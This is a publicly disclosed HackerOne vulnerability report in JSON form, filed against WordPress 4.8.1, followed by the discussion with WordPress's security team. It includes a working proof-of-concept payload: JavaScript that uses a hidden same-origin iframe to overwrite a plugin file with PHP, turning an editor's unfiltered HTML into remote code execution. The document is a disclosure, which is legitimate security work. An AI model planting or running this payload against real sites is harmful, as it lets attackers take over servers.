{"id":263718,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjM3MTg=","url":"https://hackerone.com/reports/263718","title":"Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general","state":"Closed","substate":"informative","severity_rating":"high","readable_substate":"Informative","created_at":"2017-08-27T01:55:26.996Z","submitted_at":"2017-08-27T01:55:26.996Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skansing","url":"/skansing","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-10-04T18:53:41.370Z","bug_reporter_agreed_on_going_public_at":"2017-09-06T09:01:25.027Z","team_member_agreed_on_going_public_at":"2017-10-04T18:53:41.316Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Background\nThis report is mainly about how a user with the role of editor, expectedly can post unfiltered content\nbut unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.\n\nSecondarily the report wants to highlight the technique used and the severity of it.\n\n#Description\nDuring my research I found that a XSS can, in the majority of cases, trivially be turned\ninto a RCE, by abusing same origin frame scripting in the XSS payload.\n\nI demonstrated this \"technique\" in #263058 and #263109 (no need to read, there a POC in this report).\nIt can be used to do *almost* any action from the victims perspective, like adding an administrator or editing a plugin file.\nThis adds to the severity of XSS in core wp, themes and especially plugins.\n\nIt affect the understanding of the user role 'editor' and the ability to post unfiltered content\nhttps://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html\n\nAn editor is a copy-paste and a administrator visit from RCE or performing any action.\nEditors users / accounts them self are more attractive for cracking and social engineering.\nAdministrators are not aware of the risk associated with giving a user editor role or being a editor.\nAll future reports with XSS can be escalated to RCE resulting in increased severity.\n\n\n# POC\nThis POC explores a rogue editor planting payload to RCE.\n\n- Login as editor\n- Upload a .html or plant the POC payload in content\n- Login as administrator visit a link containing the payload\n\n# POC Payload\nThe payload opens the plugin editor, edits a file and redirects to the edited file afterwards\n\n```\n\u003ciframe src=\"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\" style=\"opacity:0\"\u003e\n\u003c/iframe\u003e\n\u003cscript\u003e\nsetTimeout(function() {\n  var p = \"\u003c?php phpinfo();\"\n  // full read/write control over dom, do anything(!)\n  var d = document.querySelector(\"iframe\").contentWindow.document;\n  var c = d.querySelector(\"#newcontent\")\n  var s = d.querySelector(\"#submit\")\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n}, 4000);\n\u003c/script\u003e\n```\n\n# Suggested Fix\nthe role editor should loose all privileges that can lead to scripting\n\nconsideration on hardening could be doing a BC break and switching to `x-frame-options: deny`.\nHowever that can by bypassed by using `window.open(...)` instead of an iframe, but requires\nthe victim to click on the page after opening it. so this will only harden a bit.\n\nanother hardening option could be requiring password on critical actions such as\nplugin install, file edit, etc. it will however have an impact on accessibility and\nit might take time to find all the loop holes.\n","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["skansing","nxqp","hyper_warrior","expensivepasta"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1957725,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-08-27T01:57:38.533Z","updated_at":"2017-08-27T01:57:38.533Z","additional_data":{"old_title":"Wordpress 4.8.1 - Rogue editor leads to RCE and the risks of same origin frame scripting in general","new_title":"Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general"},"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1978749,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for your report, @skansing, and thanks for your continued interest in keeping WordPress secure via this ticket and your others.\n\nWhile your report is technically valid, this is an intentional design decision of the software. Editors are trusted users, hence they are allowed to publish unfiltered content that includes JavaScript. Your report doesn't include anything that isn't already covered in the core handbook document that you linked to.\n\nRegarding an `X-Frame-Options` header, this is considered out of scope of the H1 program because the headers that WordPress currently sends are considered a good balance of security and functionality. As you noted, changing from `X-Frame-Options: sameorigin` (the current header sent within `wp-admin`) to `X-Frame-Options: deny` would be a breaking change and would not provide a complete fix for the issue of Editors and Administrators attacking one another.\n\nYour point about requiring re-authentication as a form of intent checking is a good one. That said, there has been little interest in implementing such a feature, and plugins which provide this feature haven't gained much traction. Check out https://core.trac.wordpress.org/ticket/31779 and https://core.trac.wordpress.org/ticket/20140, and in particular the plugins linked in the comments near the bottom of the thread.","automated_response":false,"created_at":"2017-09-06T00:51:38.593Z","updated_at":"2017-09-06T00:51:38.593Z","actor":{"username":"johnbillion","cleared":false,"url":"/johnbillion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/083/8a397390a09844d8b0657ea57e4203abd852bb2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1979229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @johnbillion ,\n\nThanks for reviewing this bug. I knew at the time of the writting that this was a known feature (unfilted_html) that you also get a lot of noise in on, dublicates etc, but thought a *clear RCE chain* would help asses this at a proper severity. \n\nThe two links provided does not really have a proper security angle on it and hence are really useless to educate or handle the problem at hand.\n\nAlso my point on \"X-Frame-Option\" was not a suggestion to implement it, it was to point out that It would not migrate the problem completely as the attacker can do cross frame scripting from tab to tab via window.open.\n\nIt is nowhere known for consumers of WP that adding a editor is a open portal to RCE and *the dangers are down played* in the docs such as https://codex.wordpress.org/Hardening_WordPress , concepts such as \"Least Privilege Principle\" and \"Defense in Depth\" falls apart in light of such vector. I also read (cant find it know) a area that leaves the user the impression that the XSS from a editor cant do any really damage (which is ofc wrong (= )\n\nWhen unfiltered html means RCE in 6 lines of JS then this is something consumers should be aware of and which  wp shouldnt neglect/accept in a time where a WP RCE pays 50.000 $ at zerodium. \n\n\n\nLet make this public, this way consumers have reference that role editor or anything that gives unfiltered_html is stone throw away from a RCE. This would also give new bug hunters the possibility to escalate to RCE on any XSS. \n\nSo any XSS bug would be same bounty/severity as https://hackerone.com/reports/149589 I would presume, as the entry level is easier but the severity is harder.","automated_response":false,"created_at":"2017-09-06T09:00:59.541Z","updated_at":"2017-09-06T09:07:34.609Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1979230,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-06T09:01:25.041Z","updated_at":"2017-09-06T09:01:25.041Z","first_to_agree":true,"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1979254,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```\nIf you are running security tests against WordPress, use a lesser privileged user so that all content is filtered. If you\n are concerned about an Administrator putting XSS into content and stealing cookies, note that all cookies are\n marked for HTTP only delivery, and are divided into privileged cookies used for admin pages, and unprivileged\n cookies used for public facing pages. Content is never displayed unfiltered within the admin dashboard. Regardless,\n an Administrator has wide-ranging super powers, among which unfiltered HTML is a lesser one.\n```\n\nNotice how this text misinforms the dangers of unfiltered html and XSS in general.  And we are really concerned with the *editor*, not a administrator. With the POC chain explained, the attacker can do anything in lieu of the victim, there is no need for the attacker to get their cookies or etc, they can perform an attack as the payload trigger that bypass any need for stealing cookies/sessions.","automated_response":false,"created_at":"2017-09-06T09:21:42.744Z","updated_at":"2017-09-06T09:30:04.121Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1979274,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"An example of a report which was deemed low severity but could have lead to a RCE (https://hackerone.com/reports/253313) could easily have been escalated to RCE as the XSS has a lot higher impact than described. From the docs and reports (severity given / impact given in bounties) I would say most are not aware of this.","automated_response":false,"created_at":"2017-09-06T09:39:53.149Z","updated_at":"2017-09-06T09:44:29.499Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2044017,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"The security team are disclosing this issue publicly because the information contained within could be educational to users, but it does not expose any behaviour that is not already known and expected. Editors are -- and always have been -- considered trusted users, hence their ability to publish unfiltered content.\n\nThanks again for your interest in keeping WordPress secure, @skansing.","automated_response":false,"created_at":"2017-10-04T18:53:41.332Z","updated_at":"2017-10-04T18:53:41.332Z","actor":{"username":"johnbillion","cleared":false,"url":"/johnbillion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/083/8a397390a09844d8b0657ea57e4203abd852bb2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2044018,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-10-04T18:53:41.386Z","updated_at":"2017-10-04T18:53:41.386Z","actor":{"username":"johnbillion","cleared":false,"url":"/johnbillion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/083/8a397390a09844d8b0657ea57e4203abd852bb2e_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}